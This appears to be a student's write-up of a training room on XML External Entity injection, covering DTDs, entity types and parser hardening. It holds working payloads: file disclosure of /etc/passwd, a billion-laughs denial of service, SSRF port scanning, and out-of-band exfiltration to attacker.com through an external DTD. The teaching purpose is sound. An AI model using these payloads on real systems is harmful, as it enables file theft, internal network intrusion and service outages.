# XXE Injection

## Overview

XXE (XML External Entity) injection is a vulnerability in how applications process XML input. When an XML parser is configured to resolve external entities, an attacker can inject entity definitions that cause the server to read local files, make internal network requests, or exfiltrate data through out-of-band channels. Given the widespread use of XML in web services, SOAP APIs, and file upload features, XXE is a high-impact vulnerability class. This room covers XML fundamentals, DTDs, entity types, in-band and out-of-band XXE exploitation, SSRF via XXE, and mitigation strategies.

---

## Topics Covered

- XML structure, syntax, and use cases
- DTDs (Document Type Definitions) and their role in XXE
- XML entity types: internal, external, parameter, general, character
- In-band XXE: entity expansion, file disclosure
- Out-of-band XXE: DNS/HTTP exfiltration
- SSRF via XXE: internal network scanning
- XSLT and its relevance to XXE
- Mitigation: parser hardening across Java, .NET, PHP, Python

---

## Key Concepts

### What is XML?

XML (Extensible Markup Language) is a markup language for storing and transporting structured data. It uses opening and closing tags, attributes, and nested elements.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
  <name>John</name>
  <age>30</age>
  <address>
    <street>123 Main St</street>
    <city>Anytown</city>
  </address>
</user>
```

Common uses in web applications: REST/SOAP APIs, configuration files, data exchange formats, file imports (DOCX, SVG, etc.).

---

### DTDs (Document Type Definitions)

DTDs define the allowed structure of an XML document. They can be:
- **Internal** — embedded inside the XML document using `<!DOCTYPE>`
- **External** — referenced using the `SYSTEM` keyword

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ELEMENT config (database)>
  <!ELEMENT database (username, password)>
  <!ELEMENT username (#PCDATA)>
  <!ELEMENT password (#PCDATA)>
]>
<config><!-- configuration data --></config>
```

DTDs can declare **external entities** — this is the root cause of XXE vulnerabilities.

---

### XML Entity Types

| Type | Description | Example |
|------|-------------|---------|
| **Internal Entity** | Variable defined within the DTD, substituted in the document | `<!ENTITY inf "This is a test.">` → `&inf;` |
| **External Entity** | Contents loaded from an external file or URL | `<!ENTITY ext SYSTEM "http://example.com/data.dtd">` |
| **Parameter Entity** | Used within DTDs for reusable structures | `<!ENTITY % common "CDATA">` |
| **General Entity** | Variable for use in document content | `<!ENTITY author "John Doe">` |
| **Character Entity** | Represents reserved XML characters | `&lt;` = `<`, `&gt;` = `>`, `&amp;` = `&` |

External entities are the mechanism exploited in XXE attacks.

---

### In-Band XXE Exploitation

In-band XXE: the server includes the injected entity's content in its HTTP response, directly visible to the attacker.

#### Basic Entity Expansion

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

The `&xxe;` reference causes the parser to read `/etc/passwd` and include its contents in the `<name>` field of the response.

#### Entity Expansion (DoS — Billion Laughs)

Recursive entity expansion can be used for Denial of Service:

```xml
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<bomb>&c;</bomb>
```

Each reference expands exponentially — consuming server memory.

---

### SSRF via XXE

XXE can force the server to make HTTP requests to internal services — enabling Server-Side Request Forgery (SSRF).

**Internal port scanning payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§PORT§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

Using Burp Intruder with port numbers as the payload, the attacker can identify which internal ports respond — discovering internal services not directly accessible from the internet.

**Security implications:**
- Reconnaissance — maps the internal network topology
- Data leakage — internal services may return sensitive data in responses
- Privilege escalation — access to internal admin panels or metadata services (e.g. AWS IMDS at `169.254.169.254`)

---

### Out-of-Band XXE

Out-of-band XXE: the attacker cannot see the server's response. Data is exfiltrated via DNS queries or HTTP requests to an attacker-controlled server.

**OOB payload using HTTP:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&exfil;</foo>
```

**Attacker's `evil.dtd`:**
```xml
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

The server resolves the external DTD, then makes an HTTP request to `attacker.com` with the file contents as a URL parameter.

---

### In-Band vs Out-of-Band XXE

| | In-Band XXE | Out-of-Band XXE |
|--|------------|-----------------|
| Response visible | Yes | No |
| Exploitation complexity | Lower | Higher |
| Data channel | Same HTTP response | DNS/HTTP to external server |
| Detection | Easier | Harder |

---

## Important Terminology

| Term | Meaning |
|------|---------|
| XML | Extensible Markup Language — structured data format |
| DTD | Document Type Definition — defines allowed XML structure and entities |
| External Entity | An entity whose value is loaded from an external file or URL |
| XXE | XML External Entity injection — exploiting external entity resolution |
| SSRF | Server-Side Request Forgery — server makes requests to unintended destinations |
| In-band XXE | Response contains injected entity content, visible to attacker |
| Out-of-band XXE | Exfiltration via separate channel (DNS, HTTP) to attacker-controlled server |
| Entity expansion | XML parser replacing entity references with their declared values |
| SAX / DOM | XML parsing approaches — SAX streams, DOM builds a full tree in memory |
| XSLT | Extensible Stylesheet Language Transformations — can facilitate XXE via entity expansion |

---

## Mitigation

### General Principles

- Disable external entity and DTD processing in XML parsers
- Prefer JSON over XML where possible — JSON does not support entities
- Allowlist and validate all XML input against a strict schema
- Escape XML-special characters: `<`, `>`, `&`, `'`, `"`

### Language-Specific Hardening

**Java:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**.NET:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP:**
```php
libxml_disable_entity_loader(true);
```

**Python:**
```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

---

## Real-World Relevance

- XXE is part of the OWASP Top 10 (A05 in 2021) — consistently found in enterprise web service assessments
- File upload features accepting DOCX, SVG, or XML are common XXE entry points — the file format itself contains XML that is processed server-side
- SSRF via XXE is used to access AWS EC2 instance metadata (`169.254.169.254`) — retrieving temporary IAM credentials for cloud privilege escalation
- OOB XXE using DNS is extremely stealthy — DNS queries are often not monitored as closely as HTTP traffic
- Many Java XML libraries are vulnerable by default — disabling external entity processing is not enabled automatically in older versions

---

## Key Learnings

- XXE exploits XML parsers that are configured to resolve external entities
- Internal entities are safe; external entities (`SYSTEM "..."`) are the attack vector
- In-band XXE reads files and includes them in HTTP responses; OOB XXE exfiltrates via DNS or HTTP to an attacker server
- SSRF via XXE forces the server to make HTTP requests to internal services
- Mitigation requires explicitly disabling DTD and external entity processing in parser configuration — it is not enabled securely by default in all frameworks

---

## Conclusion

XXE injection turns an XML parser's legitimate entity-resolution feature into an attack vector for file disclosure, internal network scanning, and out-of-band data exfiltration. The vulnerability is not in the XML format itself but in how parsers are configured to process it. Disabling external entity resolution at the parser level is the definitive mitigation — and it must be applied explicitly, as many parsers resolve external entities by default.
